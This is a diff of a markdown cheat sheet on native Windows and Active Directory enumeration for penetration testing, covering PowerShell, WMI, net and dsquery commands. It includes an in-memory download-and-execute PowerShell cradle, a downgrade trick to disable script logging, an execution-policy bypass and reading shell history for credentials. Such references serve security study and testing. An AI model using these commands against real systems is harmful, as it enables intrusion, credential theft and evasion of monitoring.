@@ -1,3 +1,4 @@
+**Overview:**
 - Enumeration using only tools and commands native to Windows. Used when external tooling cannot be loaded onto the target or when stealth is required.
 - Native commands generate fewer anomalous log entries and are less likely to trigger EDR or IDS/IPS alerts than imported tools. Most enterprise environments baseline normal traffic and flag deviations.
 - PowerShell downgrades to version 2 (`powershell.exe -version 2`) disable Script Block Logging and Module Logging, which only apply to PowerShell 3+. Verify logging status in `Applications and Services Logs > Microsoft > Windows > PowerShell > Operational`.
@@ -18,26 +19,21 @@
 |`qwinsta`|Lists active sessions on the host. Useful for checking if other users are logged in.|
 
 ---
-
 ## PowerShell Enumeration
 
-|Command|Description|
-|---|---|
-|`Get-Module`|Lists available modules loaded for use.|
-|`Get-ExecutionPolicy -List`|Prints execution policy settings for each scope on the host.|
-|`Set-ExecutionPolicy Bypass -Scope Process`|Bypasses execution policy for the current process only. Reverts on exit.|
-|`Get-ChildItem Env: \| ft Key,Value`|Returns environment variables including key paths, user, and computer info.|
-|`powershell.exe -version 2`|Downgrades to PS version 2, disabling Script Block Logging and Module Logging.|
-|`netsh advfirewall show allprofiles`|Displays firewall status and rules for all profiles (Domain, Private, Public).|
-|`sc query windefend`|Checks the status of the Windows Defender service.|
-
-|Long Command|Description|
-|---|---|
-|`Get-Content $env:APPDATA\Microsoft\Windows\` `Powershell\PSReadline\ConsoleHost_history.txt`|Reads current user's PS history. May contain credentials or sensitive paths.|
-|`powershell -nop -c "iex(New-Object` `Net.WebClient).DownloadString('<url>'); <cmd>"`|Downloads and executes a file from a URL in memory without touching disk.|
+| Command                                                                                       | Description                                                                    |
+| --------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------ |
+| `Get-Module`                                                                                  | Lists available modules loaded for use.                                        |
+| `Get-ExecutionPolicy -List`                                                                   | Prints execution policy settings for each scope on the host.                   |
+| `Set-ExecutionPolicy Bypass -Scope Process`                                                   | Bypasses execution policy for the current process only. Reverts on exit.       |
+| `Get-ChildItem Env: \| ft Key,Value`                                                          | Returns environment variables including key paths, user, and computer info.    |
+| `powershell.exe -version 2`                                                                   | Downgrades to PS version 2, disabling Script Block Logging and Module Logging. |
+| `netsh advfirewall show allprofiles`                                                          | Displays firewall status and rules for all profiles (Domain, Private, Public). |
+| `sc query windefend`                                                                          | Checks the status of the Windows Defender service.                             |
+| `Get-Content $env:APPDATA\Microsoft\Windows\` `Powershell\PSReadline\ConsoleHost_history.txt` | Reads current user's PS history. May contain credentials or sensitive paths.   |
+| `powershell -nop -c "iex(New-Object` `Net.WebClient).DownloadString('<url>'); <cmd>"`         | Downloads and executes a file from a URL in memory without touching disk.      |
 
 ---
-
 ## Network Information
 
 |Command|Description|
@@ -48,7 +44,6 @@
 |`netsh advfirewall show allprofiles`|Displays firewall status across all profiles.|
 
 ---
-
 ## WMI Enumeration
 
 |Command|Description|
@@ -62,7 +57,6 @@
 |`wmic sysaccount list /format:list`|Lists system accounts used as service accounts.|
 
 ---
-
 ## Net Commands
 
 |Command|Description|
@@ -90,7 +84,6 @@
 |`net view /domain`|Lists all computers in the domain.|
 
 ---
-
 ## Dsquery
 
 Dsquery is a built-in Active Directory query tool present on any host with the AD Domain Services role installed. The `dsquery.dll` is available on all modern Windows systems at `C:\Windows\System32\dsquery.dll`. Requires elevated privileges or a SYSTEM-level command prompt.
@@ -126,7 +119,6 @@ dsquery * -filter "(userAccountControl:1.2.840.113556.1.4.803:=8192)" -limit 5 -
 Find domain controllers in the current domain by filtering for UAC bitmask value 8192. `-limit 5` caps results at five.
 
 ---
-
 ## LDAP Filter Reference
 
 LDAP filters used in dsquery and other tools follow the syntax `attribute:OID:=value`. The OID `1.2.840.113556.1.4.803` is a bitwise AND operator that matches objects where the specified bit is set in the target attribute.
